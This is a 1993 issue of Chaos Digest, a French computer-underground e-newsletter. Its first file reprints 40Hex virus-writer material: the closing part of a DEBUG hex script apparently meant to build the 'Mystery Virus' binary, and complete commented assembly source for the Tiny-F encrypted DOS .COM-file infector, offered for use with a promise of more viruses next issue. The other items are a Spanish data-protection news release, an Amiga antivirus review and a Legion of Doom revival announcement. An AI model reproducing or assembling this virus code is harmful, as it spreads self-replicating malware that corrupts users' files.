Chaos Digest              Vendredi 28 Mai 1993        Volume 1 : Numero 40
                             ISSN 1244-4901

       Editeur: Jean-Bernard Condat (jbcondat@attmail.com)
       Archiviste: Yves-Marie Crabbe
       Co-Redacteurs: Arnaud Bigare, Stephane Briere

TABLE DES MATIERES, #1.40 (28 Mai 1993)
File 1--40H VMag Issue 1 Volume 3 #008(2)-010 (reprint)
File 2--Agence de Protection des Donnees Espagnoles (creation)
File 3--"BootX" pour Amiga (critique)
File 4--Nouveau rebondissement de _The Legion of Doom_ (news)

Chaos Digest is a weekly electronic journal/newsletter. Subscriptions are
available at no cost by sending a message to:
                linux-activists-request@niksula.hut.fi
with a mail header or first line containing the following informations:
                    X-Mn-Admin: join CHAOS_DIGEST

The editors may be contacted by voice (+33 1 47874083), fax (+33 1 47877070)
or S-mail at: Jean-Bernard Condat, Chaos Computer Club France [CCCF], B.P.
155, 93404 St-Ouen Cedex, France.  He is a member of the EICAR and EFF (#1299)
groups.

Issues of ChaosD can also be found from the ComNet in Luxembourg BBS (+352)
466893.  Back issues of ChaosD can be found on the Internet as part of the
Computer underground Digest archives. They're accessible using anonymous FTP:

        * kragar.eff.org [192.88.144.4] in /pub/cud/chaos
        * uglymouse.css.itd.umich.edu [141.211.182.53] in /pub/CuD/chaos
        * halcyon.com [192.135.191.2] in /pub/mirror/cud/chaos
        * ftp.cic.net [192.131.22.2] in /e-serials/alphabetic/c/chaos-digest
        * ftp.ee.mu.oz.au [128.250.77.2] in /pub/text/CuD/chaos
        * nic.funet.fi [128.214.6.100] in /pub/doc/cud/chaos
        * orchid.csv.warwick.ac.uk [137.205.192.5] in /pub/cud/chaos

CHAOS DIGEST is an open forum dedicated to sharing French information among
computerists and to the presentation and debate of diverse views. ChaosD
material may be reprinted for non-profit as long as the source is cited.
Some authors do copyright their material, and they should be contacted for
reprint permission.  Readers are encouraged to submit reasoned articles in
French, English or German languages relating to computer culture and
telecommunications.  Articles are preferred to short responses.  Please
avoid quoting previous posts unless absolutely necessary.

DISCLAIMER: The views represented herein do not necessarily represent
            the views of the moderators. Chaos Digest contributors
            assume all responsibility for ensuring that articles
            submitted do not violate copyright protections.

----------------------------------------------------------------------

Date: Tue May 11 09:24:40 PDT 1993
From: 0005847161@mcimail.com (American_Eagle_Publication_Inc. )
Subject: File 1--40H VMag Issue 1 Volume 3 #008(2)-010 (reprint)

[suite du listing du "Mystery Virus":]


e 0530  22 00 8A E0 E8 1D 00 3D 6F 63 74 0C 3D 78 65 75
e 0540  10 E8 10 00 3C 65 EB 09 E8 09 00 3C 6D EB 02 FE
e 0550  C0 5E 58 C3 AC 3C 43 72 06 3C 59 73 02 04 20 C3
e 0560  9C 80 FC 68 2E FF 1E 91 07 C3 1E 06 56 57 50 53
e 0570  51 52 8C DE 33 C0 8E D8 C4 06 90 00 06 50 C7 06
e 0580  90 00 26 03 8C 0E 92 00 8E DE 33 C9 B8 00 43 E8
e 0590  CE FF 8B D9 80 E1 FE 3A CB 74 07 B8 01 43 E8 BF
e 05A0  FF F9 9C 1E 52 53 B8 02 3D E8 B4 FF 72 0A 8B D8
e 05B0  E8 26 00 B4 3E E8 A8 FF 59 5A 1F 9D 73 06 B8 01
e 05C0  43 E8 9C FF 33 C0 8E D8 8F 06 90 00 8F 06 92 00
e 05D0  5A 59 5B 58 5F 5E 07 1F C3 0E 1F 0E 07 BA 95 07
e 05E0  B9 18 00 B4 3F E8 78 FF 33 C9 33 D2 B8 02 42 E8
e 05F0  6E FF 89 16 AF 07 3D 00 0B 83 DA 00 72 6C A3 AD
e 0600  07 81 3E 95 07 4D 5A 75 17 A1 9D 07 03 06 AB 07
e 0610  E8 91 01 03 06 A9 07 83 D2 00 8B CA 8B D0 EB 15
e 0620  80 3E 95 07 E9 75 44 8B 16 96 07 81 C2 03 01 72
e 0630  3A FE CE 33 C9 B8 00 42 E8 25 FF 05 00 07 90 83
e 0640  D2 00 3B 06 AD 07 75 23 3B 16 AF 07 75 1D BA B1
e 0650  07 8B F2 B9 EF 02 B4 3F E8 05 FF 72 0E 3B C8 75
e 0660  0A BF 49 00 AC AE 75 03 E2 FA C3 33 C9 33 D2 B8
e 0670  02 42 E8 EB FE A3 45 07 89 16 47 07 81 3E 95 07
e 0680  4D 5A 74 0A 05 95 09 90 83 D2 00 74 19 C3 8B 16
e 0690  AD 07 F6 DA 83 E2 0F 33 C9 B8 01 42 E8 C1 FE A3
e 06A0  AD 07 89 16 AF 07 B8 00 57 E8 B4 FE 9C 51 52 81
e 06B0  3E 95 07 4D 5A 74 05 B8 00 01 EB 07 A1 A9 07 8B
e 06C0  16 AB 07 2E C7 06 47 00 00 07 BF 3A 07 AB 8B C2
e 06D0  AB A1 A5 07 AB A1 A3 07 AB BE 95 07 A4 A5 33 D2
e 06E0  B9 49 07 90 B4 40 E8 77 FE 72 27 33 C8 75 23 8B
e 06F0  D1 B8 00 42 E8 69 FE 81 3E 95 07 4D 5A 74 15 C6
e 0700  06 95 07 E9 A1 AD 07 05 46 00 A3 96 07 B9 03 00
e 0710  EB 57 EB 5D E8 8A 00 F7 D0 F7 D2 40 75 01 42 03
e 0720  06 AD 07 13 16 AF 07 B9 10 00 F7 F1 C7 06 A9 07
e 0730  49 00 A3 AB 07 05 72 00 A3 A3 07 C7 06 A5 07 00
e 0740  01 81 06 AD 07 49 07 83 16 AF 07 00 A1 AD 07 25
e 0750  FF 01 A3 97 07 9C A1 AE 07 D0 2E B0 07 D1 D8 9D
e 0760  74 01 40 A3 99 07 B9 18 00 BA 95 07 B4 40 E8 EF
e 0770  FD 5A 59 9D 72 06 B8 01 57 E8 E4 FD C3 1E E8 07
e 0780  00 C6 06 00 00 4D 1F C3 50 53 B4 62 E8 D1 FD 8C
e 0790  C8 48 4B 8E DB F9 13 1E 03 00 3B D8 72 F5 5B 58
e 07A0  C3 A1 9D 07 BA 10 00 F7 E2 C3 FE FF FD 00 FE 40
e 07B0  75 73 73 72 40 40 40 40 40 76 89 92 95 73 8F 86
e 07C0  94 40 40 48 83 49 40 40 96 51 4E 40 51 59 59 50
e 07D0  40 FD 00 FE FC FD 00 4A 01 03 01 B8 01 0B 01 4A
e 07E0  01 06 01 72 01 01 02 9F 01 09 01 15 01 02 02 15
e 07F0  01 03 02 72 01 08 01 4A 01 05 02 26 01 01 01 4A
e 0800  01 08 02 15 01 03 02 15 01 03 03 26 01 08 02 26
e 0810  01 05 01 4A 01 01 02 72 01 08 01 72 01 04 01 72
e 0820  01 04 00 72 01 08 02 9F 01 06 02 B8 01 01 02 EE
e 0830  01 0F FF FF FF 00 00 00 01 00 00 00 00 00 00 00
e 0840  01 3A 16 D8 8E C3 8E B8 00 4C 05 00 00 00 1A 1A

rcx
74e
w
q

+++++

 40Hex Issue 3                                                      0009

                            The Tiny-F Virus

       In our first issue we gave you the source for the Tiny-B virus.
       Well some people don't quit.

       After months of struggling Psyco-genius decided to give
       his attempts to make this a good virus over to someone who
       knows what he's doning.

       So Dark (mastered assembler in one week) Angel did some mods
       and here we have it.

-------------------------------------------------------------------------
tinyv   SEGMENT BYTE PUBLIC 'code'
        ASSUME  CS:tinyv, DS:tinyv, SS:tinyv, ES:tinyv

        ORG     100h

DOS     EQU     21h

start:  JMP     pgstart
exlbl:  db      0CDh, 20h, 7, 8, 9
pgstart:CALL    tinyvir
tinyvir:
        POP     SI                      ; get SI for storage
        SUB     SI,offset tinyvir       ; reset SI to virus start
        MOV     BP,[SI+blnkdat]         ; store SI in BP for return
        ADD     BP, OFFSET exlbl
        CALL    endecrpt
        JMP     SHORT realprog

;------------------------------------------------------------------------
;nonencrypted subroutines start here
;------------------------------------------------------------------------

;PCM's encryption was stupid, mine is better - Dark Angel
endecrpt:
;Only need to save necessary registers - Dark Angel
        PUSH    AX                      ; store registers
        PUSH    BX
        PUSH    CX
        PUSH    SI
;New, better, more compact encryption engine
        MOV     BX, [SI+EN_VAL]
        ADD     SI, offset realprog
        MOV     CX, endenc - realprog
        SHR     CX, 1
        JNC     start_encryption
        DEC     SI
start_encryption:
        MOV     DI, SI
encloop:
        LODSW                           ;DS:[SI] -> AX
        XOR     AX, BX
        STOSW
        LOOP    encloop

        POP     SI                      ;restore registers
        POP     CX
        POP     BX
        POP     AX
        RET
;-----end of encryption routine
nfect:
        CALL    endecrpt
        MOV     [SI+offset endprog+3],AX;point to data
        MOV     AH,40H                  ;write instruction
        LEA     DX,[SI+0105H]           ;write buffer loc    |
        MOV     CX,offset endprog-105h  ;(size of virus)  --\|/--
        INT     DOS                     ;do it!
        PUSHF
        CALL    endecrpt
        POPF
        JC      outa1                    ;error, bug out
        RET
outa1:
        JMP     exit


;------------------------------------------------------------------------
;    Unencrypted routines end here
;------------------------------------------------------------------------
realprog:
        CLD                             ;forward direction for string ops
;Why save DTA?  This part killed.  Saves quite a few bytes.  Dark Angel
;Instead, set DTA to SI+ENDPROG+131h
        MOV     AH, 1Ah                 ;Set DTA
        LEA     DX, [SI+ENDPROG+131h]   ; to DS:DX
        INT     21h

        LEA     DX,[SI+fspec]           ;get filespec (*.COM)
        XOR     CX, CX                  ;       ||   (clear regs)
        MOV     AH,4EH                  ;       ||   (find files)
mainloop:                               ;      \||/
        INT     DOS                     ;   ----\/----
        JC      hiccup                  ;no more files found, terminate virus
;Next part had to be changed to account for new DTA address - Dark Angel
        LEA     DX, [SI+ENDPROG+131h+30];set file name pointer
                                        ;(offset 30 is DTA filename start)
        MOV     AX,3D02H                ;open file
        INT     DOS                     ;do it!
        MOV     BX,AX                   ;move file handle to BX
        MOV     AH,3FH                  ;read file
        LEA     DX,[SI+endprog]         ;load end of program (as buffer pntr)
        MOV     DI,DX                   ;set Dest Index to area for buffer
        MOV     CX,0003H                ;read 3 bytes
        INT     DOS                     ;do it!
        CMP     BYTE PTR [DI],0E9H      ;check for JMP at start
        JE      infect                  ;If begins w/JMP, Infect
nextfile:
        MOV     AH,4FH                  ;set int 21 to find next file
        JMP     mainloop                ;next file, do it!
hiccup: JMP     exit
infect:
        MOV     AX,5700h                ;get date function
        INT     DOS                     ;do it!
        PUSH    DX                      ;store date + time
        PUSH    CX
        MOV     DX,[DI+01H]             ;set # of bytes to move
        MOV     [SI+blnkdat],DX         ; "  " "    "   "   "
;Tighter Code here - Dark Angel
        XOR     CX,CX                   ; "  " "    "   "   " (0 here)
        MOV     AX,4200H                ;move file
        INT     DOS                     ;do it!
        MOV     DX,DI                   ;set dest index to area for buffer
        MOV     CX,0002H                ;two bytes
        MOV     AH,3FH                  ;read file
        INT     DOS                     ;do it!
        CMP     WORD PTR [DI],0807H     ;check for infection
        JE      nextfile                ;next file if infected
getaval:                                ;encryption routine starts here
;My modifications here - Dark Angel
        MOV     AH, 2Ch                 ;DOS get TIME function
        INT     DOS                     ;do it!
        OR      DX, DX                  ;Is it 0?
        JE      getaval                 ;yeah, try again
        MOV     word ptr [si+offset en_va], DX ; Store it
;Tighter code here - Dark Angel
        XOR     DX,DX                   ;clear regs
        XOR     CX,CX                   ;  "    "
        MOV     AX,4202H                ;move file pointer
        INT     DOS                     ;do it!
        OR      DX,DX                   ;new pointer location 0?
        JNE     nextfile                ;if no then next file
        CMP     AH,0FEH                 ;new pointer loc too high?
        JNC     nextfile                ;yes, try again
        CALL    nfect
        MOV     AX,4200H                ;move pointer
        XOR     CX, CX                  ;clear reg
        MOV     DX,OFFSET 00001         ;where to set pointer
        INT     DOS                     ;do it!
        MOV     AH,40H                  ;write to file
        LEA     DX,[SI+offset endprog+3];write data at SI+BUFFER
        MOV     CX,0002H                ;two bytes (the JMP)
        INT     DOS                     ;do it!
        MOV     AX,5701h                ;store date
        POP     CX                      ;restore time
        POP     DX                      ;restore date
        INT     DOS                     ;do it!
exit:
        MOV     AH,3EH                  ;close file
        INT     DOS                     ;do it!

;Return DTA to old position - Dark Angel

        MOV     AH, 1Ah                 ;Set DTA
        MOV     DX, 80h                 ; to PSP DTA
        INT     21h

        JMP     BP

;------------------------------------------------------------------------
;encrypted data goes here
;------------------------------------------------------------------------

fspec   LABEL   WORD
        DB      '*.COM',0
nondata DB      'Tiny-F version 1.1'    ;Program identification
        DB      '%$!"&%',=)%&-!'        ;author identification
        DB      'Released 10-19-91'     ;release date
endenc  LABEL   BYTE                    ;end of encryption zone
;------------------------------------------------------------------------
;nonencrypted data goes anywhere after here
;------------------------------------------------------------------------

blnkdat LABEL   WORD
        DW      0000H

;Only en_val is needed now because of new encryption mechanism
en_val  DW      0h

endprog LABEL   WORD
tinyv   ENDS
        END     start

+++++

40Hex Issue 3                                                       0010

                              In Closing

     Well that will do it for this issue.  Sorry it took so damn long,
     but screw it.

     Next issue we will have more articals, more viruses, and all that.

     We were supposed to have an interview with an Amiga virus writer
     this issue but we just couldn't get it in time.  Also we were
     planning an interview with John Mcafee, but the same story there.

     Also next issue, I hope to have the Bob Ross virus, from the
     twisted mind of Dark Angel.  And If I can find it, the DIR-2 virus
     and The Teqeulla Virus, so I can't spell.

     See you then.

------------------------------

Date: Sun, 16 May 93 21:01:10 -0100
From: rfcalvo@guest2.atimdr.es (Rafael Fernandez Calvo )
Subject: File 2--Agence de Protection des Donnees Espagnoles (creation)


    CCCCC  LL     II
   CC      LL     II
   CC      LL     II    --  N E W S   FROM   S P A I N  --- May 16, 1993
    CCCCC  LLLLLL II

 COMMISSION for LIBERTIES
 and INFORMATICS (*)


       DATA PROTECTION AGENCY CREATED BY THE SPANISH COVERNMENT
       ++++++++++++++++++++++++++++++++++++++++++++++++++++++++

     The Government of the Kingdom of Spain approved on May 4th, 1993 the
Estatute of the Data Protection Agency (Agencia de Proteccion de Datos), the
body that, according to the Law on Protection of Personal Data (whose acronym
is LORTAD) approved by the Spanish Parliament in October 1992, will watch
over proper observance of this law.

     According to its Estatute, the Agency is an independent body, headed
by its Director, who will be nominated by the Government among the members
of the Consultive Council. The Council will have nine members, elected for
a period of four years by the Congress, the Senate, the Ministry of Justice,
the Regional Governments, the Federation of Provinces and Cities, the Royal
Academy of History, the Council of Universities, the Council of Consumers and
Users, and the Council of Chambers of Commerce, respectively. Trade Unions
and DP Professionals will not be represented in spite of the proposals of
CLI, that also submitted one of having the Director nominated by the Council
itself instead of by the Government in order to insure the independence of
the Agency

     Among the powers of the Agency are those of dictating fines of up to
1 Million US $ and sealing personal data files of companies and entities that
infringe the law. The Agency will the body representing Spain in the European
Community, the Council of Europe and the Schengen Agreement on free
circulation of people within the EC borders for all the matters regarding
personal data protection.

     The Data Protection Agency will have to be created in the middle of a
sharp campaign for Congress and Parliament in elections that will be held on
June 6, whose outcome, according to the polls, will be very tight between the
ruling Socialist Party and the center-right People's Party, with a well
placed third party: United Left (a communist-led coalition). These two
parties gave strong support to the position of CLI with regard to the LORTAD
during its discussion in Congress and Senate.

      CLI achieved in February its goal of seeing the appeal against the
Personal Data Law put before the Constitutional Court of Spain by the
Ombudsman, the Peoples' Party and the Regional Parliament of Catalonia. The
appeals address basically the concerns of CLI that the law establishes a lot
of unjustified exceptions in favour of Government with regard to the rights
that citizens have about their personal data. Even though the appeals don't
interrupt the application of the law since Jan. 31, they leave the door open
to its modification in the sense promoted by CLI.

     Let's recall that Spain is one of the very few countries whose Carta
Magna foresees the dangers that can stem from misuse of Information
Technology. In fact, its Constitution establishes that a "law will limit the
use of Information Technologies in order to protect citizens' honour and
their personal and family privacy as well as the unrestricted exercise of
their rights" (article 18.4).

      The position of CLI about the LORTAD can be summarized as follows:

- The law does not fulfill the expectations arisen, although it is a step
forward in comparison with the current situation of "allegality" that has
been a constant source of severe abuse against privacy;

- The good side of the law is the regulation of personal data files
in the hands of companies and private entities. Citizens will have
wide rights to access, modification and cancellation of this kind of
records.

- The bad side stems from the following facts:

   a) The bill gives excessive and uncontrolled power to Policy Forces
   over collection and computerization of highly sensitive data: ideology,
   religion, beliefs, racial origin, health and sexual orientation.

   b) Computerized personal data records in the hands of all branches
   of Public Administrations will be in many cases excluded from the rights
   (access, modification, cancellation) given to citizens with regard to
   the same kind of data in the hands of private companies.

   c) The Data Protection Agency that will watch over proper observance of
   the law will have scarce autonomy from the Government, that will
   nominate and dismiss its Director.


* SOME WORDS ABOUT CLI

     The --Commission for Liberties and Informatics, CLI-- is an independent
and pluralistic organization that was officially constituted in April '91.

      Its mission is to "promote the development and protection of citizens'
rights, specially privacy, against misuse of Information Technologies".

     As of May '93, CLI is composed by nine organizations, with a joint
membership of about 3,000,000 people. They cover a very wide spectrum of
social interest groups: associations of computer professionals, judges, civil
rights leagues, trade unions, consumers groups, direct marketing industry,
etc.

     CLI is confederated with similar bodies created in some other Spanish
Regions such as Valencia, Basque Country and Catalonia, and has fluid
working relationships with many public and private Data Protection bodies
and entities all over the world, including CNIL, CPSR and Privacy
International.

     CLI has its headquarters in:

Padilla 66, 3 dcha.
E-28006 Madrid, Spain

Phone: (34-1) 402 9391
Fax: (34-1) 309 3685
E-mail: rfcalvo@guest2.atimdr.es

------------------------------

Date: Sun May 23 00:06:00 -0600 1993
From: roberts@decus.arc.ab.ca ("Rob Slade, DECrypt Editor, VARUG NLC rep )
Subject: File 3--"BootX" pour Amiga (critique)
Copyright: Robert M. Slade, 1993


                               Comparison Review

Company and product:

Peter Stuer
Kauwlei 21
B-2550 Kontich
Belgium
Peter.Stuer@p7.f603.n292.z2.FidoNet.Org
BootX 5.23

Summary: Scanner and disinfector with some operation restriction

Cost: unknown

Rating (1-4, 1 = poor, 4 = very good)
      "Friendliness"
            Installation
            Ease of use
            Help systems
      Compatibility
      Company
            Stability
            Support
      Documentation
      Hardware required
      Performance
      Availability
      Local Support

General Description:

                  Comparison of features and specifications

User Friendliness

Installation

Both automated and manual installation is provided.

Ease of use

BootX can be run from either the CLI or the Workbench.  Once invoked it can
be made the "foreground task" by a "hot key" call.  The program is menu
driven, with a comprehensive range of actions.

Help systems

Can use the AmigaGuide.library function if available.

Compatibility

Unknown but unlikely to cause problems.  Some problems are noted with
Enforcer.  Will work with certain compression programs to check compressed
executables.

Company Stability

Unknown, but this is currently one of the major recommended Amiga antivirals.
The program is distributed as freeware.

Company Support

The author's mail and email addresses are given, as well as contact info for
"Safe Hex International".

Documentation

Simple but straightforward directions on the installation and running of the
program.  There is little general discussion of viral programs and operation,
but some is mentioned in conjunction with certain features of the program.
Unusually for a shareware/freeware package there is an extensive glossary
which may provide some background.  (I learned, for instance, that a
"linkvirus" is the term for what is more generally known as a program or file
infecting virus).

System Requirements

512K RAM or higher and at least one disk drive.  KickStart v2.04 and
ReqTools.library v38 or higher.  Workbench v2.1 or higher to use the language
independence utility and v3.0 or higher to use the AmigaGuide.library help
feature.  Various decompression programs may be needed to check compressed
executables.

Performance

Unknown at this time due to lack of a test suite.  Currently one of the most
highly recommended Amiga antivirals.

Local Support

The author is reachable via Fidonet and Internet mail.

Support Requirements

Users experienced with using shareware should have no problems.

==============
Vancouver      ROBERTS@decus.ca         | Slade's Law of Computer
Institute for  Robert_Slade@sfu.ca      |        Literacy:
Research into  rslade@cue.bc.ca         |   - There is no such thing
User           p1@CyberStore.ca         |     as "computer illiteracy";
Security       Canada V7K 2G6           |     only illiteracy itself.


[ChaosD: Voici les commentaires de l'auteur de ce programme sur ce papier:]

Date: Wed May 26 17:58:49 PDT 1993
From: Peter.Stuer@p7.f603.n292.z2.fidonet.org (Peter Stuer )

Hum...seems you're a bit behind on the news. I stopped developing BootX last
March because of lack of time.

  /~\
 C oo
 _( ^)
/   ~\  Peter Stuer.

--
uucp: uunet!m2xenix!puddle!2!292!603.7!Peter.Stuer
Internet: Peter.Stuer@p7.f603.n292.z2.fidonet.org

------------------------------

Date: Tue, 25 May 1993 10:32:28 -0400
From: tdc@zooid.guild.org (TDC )
Subject: File 4--Nouveau rebondissement de _The Legion of Doom_ (news)


                        Final Anouncement

                               The
                               LOD
                          Legion of Doom
                             Is Back!

No that has not been a mis-print... the LOD has returned!  The world's
greatest hacking group has formally been reinstated to bring back dignity
and respect to a scene that has rapidly deteriorated since its departure.

The LOD is not just another "Group" that goes around with upper/lower case
names, trading in PBX's and VMB's and wouldn't know COSMOS if it hit them
over the head.  It's a sad day indeed when the term hacker is used to refer
to every code and credit card abusing rodent in the nation.  We intend
through our presence and many innovative projects, not to mention the
technical journal to restore the original values of technical exploration
and knowledge that the term hacker was founded on.

The LOD imbodies the pinnacle of understanding that comes from relentless
exploration of the "system" backwards and forwards.  It is an organization
dedicated to understanding the world's computer and telephone networks.
Enabling everyone to progress forward in technology.  The accumulated product
of this--the Technical Journals, full of information unavailible anywhere
except from telco manuals represents something to valuable to lose.

[...] This will be the primary of purpose the new, revived LOD - the assembly
and release of a Technical Journal.  The previous four issues, now several
years old BADLY need updating.

The Journal will rely heavily on reader submitted articles and information,
so anything you wish to contribute would be GREATLY appreciated.  Acceptable
submitions would include ORIGINAL "how-to- guides" on various systems,
security discussions, technical specifications and doccumentation.  Computer
and telephone related subjects are not the only ones acceptable.  If you
remember the former journals had articles concerning interrogation, physical
security among others.

The next LOD Technical Journal will comprise almost entirely of freelance or
reader submitted articles. So without YOUR contributions it can not proceed!
Solid progress is being made in the next Technical Journal by both free-
lancers and group members.  But bigger is better, as you can never have too
much information or instruction.

SEND UP ALL ORIGINAL ARTICLES FOR PUBLICATION!!!

If you wish to hold the wonderful honour of being an LOD Member  (Won't
this look good on the resume), you may apply by contacting us.  The
qualifications should need no elaboration.

Regardless of the unbased claims made by others, the LOD is as strong and
capable as it ever was.  Legendary groups like the LOD are not born this way.
They take time to form, and restarting almost from scratch almost three years
later, time is obviously needed.  We say to all the skeptics, hang on to your
premature judgements until we're on our feet and judge by actions not
opinions.

To set the record straight once and for all, and to convince the skeptics
that doubt the validity of all this, the Legion of Doom >IS< BACK.  Next
month, a full-fledged Technical Journal will be widely released, and you're
doubts and questions will be once and for all answered with uncontestable
fact.

In addition to needing articles for the upcoming Journals, some sites on the
net to aid in distribution would also be welcomed.  Someone willing to donate
the resources necessary to operate a subscription type mailing list service
is also needed.  Send all offers and articles to our email account or PO Box.

Reach us at:            tdc@zooid.guild.org

Or by blindingly quick, faster than light mail at:

                                LOD
                            P.O. Box 104
                         4700 Keele Street
                       North York, ON  M3J-1P3

Closing date for article submittions to the LOD Technical Journal
Number 5 is: Monday 14 June, 1993.

Release date: Friday 18 June, 1993.

Since we have no monetary or contractual obligation to anyone, these dates
are of course tentative. But since or at least initially we will rely almost
entirely on reader submitions a date is needed to get potential writers into
gear.

Note that the LOD does not engage or condone illegal or criminal activities.
This would cover, but is not limited to, theft of long distance services,
credit fraud or data destruction/alteration.

Lord Havoc

------------------------------

End of Chaos Digest #1.40
************************************

Downloaded From P-80 International Information Systems 304-744-2253
